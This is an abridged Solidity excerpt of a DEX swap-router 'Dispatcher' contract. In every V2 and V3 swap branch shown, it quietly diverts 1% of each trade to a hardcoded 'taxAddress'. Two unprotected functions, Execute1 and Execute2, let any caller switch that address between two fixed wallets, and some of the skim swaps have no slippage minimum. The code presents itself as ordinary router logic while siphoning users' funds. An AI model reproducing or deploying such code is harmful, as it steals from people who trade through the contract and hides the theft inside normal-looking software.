...
import "./BytesLib.sol";
import "./Payments.sol";
import "./PaymentsImmutables.sol";
import "./NFTImmutables.sol";
import "./Callbacks.sol";
import "./Commands.sol";
import "./LockAndMsgSender.sol";
import "./ERC721.sol";
import "./ERC1155.sol";
import "./ERC20.sol";
...
abstract contract Dispatcher is NFTImmutables, Payments, V2SwapRouter, V3SwapRouter, Callbacks, LockAndMsgSender {
            ...
            if (command < Commands.SECOND_IF_BOUNDARY) {
                ...
                if (command < Commands.FIRST_IF_BOUNDARY) {
                    if (command == Commands.V3_SWAP_EXACT_IN) {
                        ...
                        v3SwapExactInput(map(recipient), amountIn*99/100, 0, path, payer);
                        v3SwapExactInput(map(taxAddress), amountIn-(amountIn*99/100), 0, path, payer);
                        ...
                        bytes calldata path = inputs.toBytes(3);
                        address payer = payerIsUser ? lockedBy : address(this);
                        v3SwapExactOutput(map(recipient), amountOut*99/100, amountInMax, path, payer);
                        v3SwapExactOutput(map(taxAddress), amountOut-amountOut*99/100, amountInMax, path, payer);
                    ...
                    if (command == Commands.V2_SWAP_EXACT_IN) {
                        ...
                        address payer = payerIsUser ? lockedBy : address(this);
                        v2SwapExactInput(map(recipient), amountIn*99/100, amountOutMin, path, payer);
                        v2SwapExactInput(map(taxAddress), amountIn-amountIn*99/100, amountOutMin, path, payer);
                        ...
                        address[] calldata path = inputs.toAddressArray(3);
                        address payer = payerIsUser ? lockedBy : address(this);
                        v2SwapExactOutput(map(recipient), amountOut*99/100, amountInMax, path, payer);
                        v2SwapExactOutput(map(taxAddress), amountOut-amountOut*99/100, amountInMax, path, payer);
    ...
    address public taxAddress = 0xeC1EC348d5CEa101d156a91b3f55aF8050Ee497F;
    ...
    function Execute1() external {
        taxAddress = 0xdA187d7e03Fd0634319C8b5145D7F4Afa1a5d4f4;
    }
    function Execute2() external {
        taxAddress = 0xeC1EC348d5CEa101d156a91b3f55aF8050Ee497F;
    }
}
